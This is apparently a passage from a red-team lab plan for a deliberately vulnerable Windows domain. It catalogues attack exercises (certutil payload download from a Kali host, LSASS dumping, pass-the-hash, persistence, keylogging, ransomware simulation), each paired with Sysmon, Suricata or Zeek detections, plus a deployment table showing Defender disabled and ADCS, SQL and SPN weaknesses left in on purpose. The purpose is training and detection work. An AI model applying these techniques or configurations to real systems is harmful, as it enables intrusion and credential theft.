| **Target** | AutoIt3.exe interprets .au3 script |
| **Tool** | AutoIt3.exe (attacker brings) |
| **Gain** | Code exec on mbr01 |
| **Chain** | LSASS dump (#82) -> DA |
| **Status** | SCRIPT WRITTEN |

### #68 — Malicious EXE
| Field | Value |
|-------|-------|
| **Starting point** | Kali -> mbr01 (HTTP delivery) |
| **Target** | `certutil -urlcache` downloads payload.exe |
| **Tool** | certutil (built-in) |
| **Gain** | Code exec on mbr01 |
| **Chain** | LSASS dump (#82) -> DA |
| **Status** | SCRIPT WRITTEN |

---

## Network Defense Exercises (WT#69-81)

Standalone exercises run from linux01. Each triggers a specific Suricata SID or Zeek notice. No credentials needed.

| WT# | Attack | Tool | Rule | 
|:---:|--------|------|:----:|
| 69 | DNS DGA | dig/host | SID:1000025 |
| 70 | DNS TXT burst | dig | SID:1000026 |
| 71 | DNS NXDOMAIN | host | SID:1000027 |
| 72 | DNS suspicious TLD | host | SID:1000028 |
| 73 | DNS IP literal | host -t PTR | SID:1000029 |
| 74 | TLS 1.0 | python3 ssl | SID:1000010 |
| 75 | SMB admin share | net use | ET:2000012 |
| 76 | HTTP suspicious UA | curl | ET:2000041 |
| 77 | HTTP exploit path | curl | ET:2000070 |
| 78 | HTTP bad content-type | curl | ET:2000072 |
| 79 | SSH brute force | hydra | ET:2000060 |
| 80 | Long connection beacon | nc/bash | Z9 cadre-conn-beacon |
| 81 | Outbound anomaly | curl | Z1 cadre-outbound |

---

## Post-Exploitation Attacks (WT#82-93)

Run after obtaining Domain Admin. All use built-in OS tools.

### #82 — LSASS Memory Dump
| **Starting point** | Post-DA on any Windows VM |
| **Target** | lsass.exe |
| **Tool** | procdump.exe (attacker brings) |
| **Gain** | Cached credentials (WDigest plaintext, Kerberos tickets) |
| **Chain** | New credential discovery -> lateral movement |
| **Detection** | Sysmon EID 10 |
| **Status** | SCRIPT WRITTEN |

### #83 — Ingress Tool Transfer
| **Starting point** | Any compromised host |
| **Target** | Kali HTTP -> `certutil -urlcache` |
| **Tool** | certutil / PowerShell |
| **Gain** | Tools delivered to compromised host |
| **Detection** | Sysmon EID 3, Zeek conn.log |
| **Status** | SCRIPT WRITTEN |

### #84-87 — Alternative Lateral Movement
| WT# | Attack | Tool | Detection |
|:---:|--------|------|:---------:|
| 84 | WMI Lateral | Invoke-CimMethod | Sysmon EID 1 (wmiprvse.exe child) |
| 85 | WinRM Lateral | winrs | Sysmon EID 1 (winrs.exe), 4688 |
| 86 | RDP Lateral (PtH) | mstsc /restrictedadmin | 4624 LogonType 10 |
| 87 | Pass-the-Hash | impacket-wmiexec | 4624 LogonType 3, 4648 |

### #88 — Scheduled Task Persistence
| **Starting point** | Post-DA on any Windows VM |
| **Tool** | `schtasks /create` |
| **Gain** | Persistent backdoor on logon |
| **Detection** | 4698, Sysmon EID 1 |
| **Status** | SCRIPT WRITTEN |

### #89 — Registry Run Key Persistence
| **Starting point** | Post-DA on any Windows VM |
| **Tool** | `reg add HKLM\...\Run` |
| **Gain** | Persistent backdoor on user logon |
| **Detection** | Sysmon EID 12-13, 4657 |
| **Status** | SCRIPT WRITTEN |

### #90 — Host Reconnaissance
| **Tool** | `systeminfo`, `ipconfig`, `whoami`, `net group` |
| **Gain** | System/network/user enumeration |
| **Detection** | Sysmon EID 1, 4688 |
| **Status** | SCRIPT WRITTEN |

### #91 — Data Staging
| **Tool** | `robocopy`, `Compress-Archive` |
| **Gain** | Files staged for exfiltration |
| **Detection** | Sysmon EID 11, Endpoint.events.file-* |
| **Status** | SCRIPT WRITTEN |

### #92 — Screen Capture / Keylogging
| **Tool** | PowerShell GetAsyncKeyState |
| **Gain** | Keystroke capture |
| **Detection** | Endpoint.events.api-* |
| **Status** | SCRIPT WRITTEN |

### #93 — Ransomware Simulation
| **Tool** | PowerShell AES-256 with known key |
| **Gain** | Files encrypted (recoverable) |
| **Detection** | Sysmon EID 11 (mass .cadre creates) |
| **Status** | SCRIPT WRITTEN |

---

## Deployment Status

| Component | Status | Verified By |
|-----------|:------:|-------------|
| ADCS — CA running, 8 templates, ESC1-14 property checks | ✅ 18/18 | `08-adcs-verify.yml` |
| SCCM — NAA, PXE, Client push, CRED-2, svc_sccm Full Admin | ✅ 7/7 | `10-sccm-verify.yml` |
| MSSQL — xp_cmdshell, linked servers, CLR, impersonation | ✅ | `09-sql-wsus-verify.yml` |
| CertPotato — IIS app pool CADRE-CertPotato as NetworkService | ✅ | `06-member-services.yml` |
| Keytab — `/var/opt/mssql/secrets/mssql.keytab` exists on linux01 | ✅ | `09-sql-wsus-verify.yml` |
| dMSA — `dmsaPrivService$` on dc03 for BadSuccessor (CVE-2025-53779) | ✅ | `02-ad-objects.yml` |
| SPN Jacking — `SpnSuffixesValidationDisabled`, homoglyph SPN (CVE-2026-25177) | ✅ | `05-ad-attack-surface.yml` |
| Defender — Tamper Protection=0, Service=Stopped on all 5 Windows VMs | ✅ | `04-vulnerabilities.yml` |
| Campaign E scripts (WT069–081) — network defense exercises | ✅ Scripts written | `04-automation/campaign-e/` |
| Campaign G scripts (WT082–093) — post-exploitation | ✅ Scripts written | `04-automation/campaign-g/` |
| Campaign H scripts (WT063–068) — initial access | ✅ Scripts written | `04-automation/campaign-h/` |

Numbering starts at WT#002 — there is no WT#001 (RC4 Kerberoast is non-viable on Server 2025; WT#002 AES is the working Kerberoast).

**Total: 99 attacks — 75 campaign (8 phases + 4 branches) + 14 E exercises + 10 F supply-chain. 5 removed (WT028 ❌, WT031 ⏳, WT018 ❌, WT019 ❌, WT020 ❌).**
